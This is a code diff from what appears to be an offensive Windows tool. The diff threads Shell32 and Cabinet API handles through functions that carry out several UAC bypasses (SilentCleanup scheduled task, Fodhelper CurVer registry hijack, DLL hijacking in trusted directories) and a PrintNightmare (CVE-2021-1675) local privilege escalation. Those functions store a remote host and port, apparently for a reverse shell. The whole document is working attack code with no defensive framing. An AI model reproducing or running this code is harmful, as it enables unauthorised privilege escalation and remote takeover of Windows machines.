@@ -42,7 +42,7 @@ BOOL ExploitCleanUp(Advapi32_API advapi32, char* regPath, char* regName) {
     return FALSE;
 }
 
-BOOL ExploitSilentCleanup(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAddress, char* port) {
+BOOL ExploitSilentCleanup(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port) {
     BOOL returnValue = FALSE;
     PVOID pOldVal = NULL;
 
@@ -57,7 +57,7 @@ BOOL ExploitSilentCleanup(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAd
         if (SaveRHostInfo(advapi32, ipAddress, port)) {
 
             // schtasks.exe error ???
-            returnValue = Run("schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
+            returnValue = Run(shell32,"schtasks.exe", "/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
         } else
             printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
 
@@ -70,7 +70,7 @@ BOOL ExploitSilentCleanup(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAd
 }
 
 
-BOOL ExploitOpenShell(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
+BOOL ExploitOpenShell(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec) {
     BOOL returnValue = FALSE;
     PVOID pOldVal = NULL;
     char* regKey = (char*)malloc(MAX_PATH +1);
@@ -87,7 +87,7 @@ BOOL ExploitOpenShell(Advapi32_API advapi32, char* PathExeToRun, WCHAR* ipAddres
         returnValue &= SetRegistryValue(advapi32, HKEY_CURRENT_USER, (char*)regKey, "", PathExeToRun);
         if (returnValue) {
             if (SaveRHostInfo(advapi32, ipAddress, port)) {
-                returnValue = RunAs(uac_bypass_data[UacBypassTec].targetExe, NULL);
+                returnValue = RunAs(shell32, uac_bypass_data[UacBypassTec].targetExe, NULL);
             }else
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST/RPORT information");
         }
@@ -149,11 +149,11 @@ BOOL ExploitCurVer(Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRu
 
 
 
-BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
+BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shell32, Cabinet_API cabinetAPI, char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_TEC UacBypassTec, char* wincatDefaultDir) {
     BOOL returnValue = FALSE;
     if (UacBypassTec == UAC_BYPASS_PRINT_NIGHTMARE){
         printMsg(STATUS_OK, LEVEL_DEFAULT, "Local Privilege Escalation: 'PrintNightmare - (CVE-2021-1675)'\n");
-        returnValue = ExploitPrintNightmareLPE(advapi32,PathExeToRun, ipAddress, port, wincatDefaultDir);
+        returnValue = ExploitPrintNightmareLPE(kernel32,  advapi32, cabinetAPI, PathExeToRun, ipAddress, port, wincatDefaultDir);
     } else{
         if (!IsUACEnabled(advapi32)){
             printMsg(STATUS_WARNING, LEVEL_DEFAULT, "UAC is disabled.\n");
@@ -161,14 +161,14 @@ BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shel
                 printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail to save RHOST information");
                 return FALSE;
             }
-            return RunAs(PathExeToRun, NULL);
+            return RunAs(shell32, PathExeToRun, NULL);
         } else{
             UAC_POLICY uacPolicy = CheckUACSettings(advapi32);
             if (uacPolicy == UAC_POLICY_DEFAULT || uacPolicy == UAC_POLICY_DISABLE){
 
                 if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN){
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
-                    returnValue = ExploitSilentCleanup(advapi32, PathExeToRun, ipAddress, port);
+                    returnValue = ExploitSilentCleanup(advapi32, shell32, PathExeToRun, ipAddress, port);
 
                 } else if (UacBypassTec == UAC_BYPASS_FOD_HELP_CUR_VER){
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Fodhelper - CurVer'\n");
@@ -176,11 +176,11 @@ BOOL RunUacBypass(Kernel32_API kernel32, Advapi32_API advapi32, Shell32_API shel
                 } else if (UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR){
 
                     printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
-                    returnValue = ExploitTrustedDirectories(kernel32, advapi32, PathExeToRun, ipAddress, port);
+                    returnValue = ExploitTrustedDirectories(kernel32, advapi32, shell32, cabinetAPI, PathExeToRun, ipAddress, port);
                 } else{
                     if (UacBypassTec >= 0 && UacBypassTec < 2) {
                         printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
-                        returnValue = ExploitOpenShell(advapi32, PathExeToRun, ipAddress, port, UacBypassTec);
+                        returnValue = ExploitOpenShell(advapi32, shell32, PathExeToRun, ipAddress, port, UacBypassTec);
                     }
                     else {
                         printf("\t[x] Error var UacBypassTec\n");
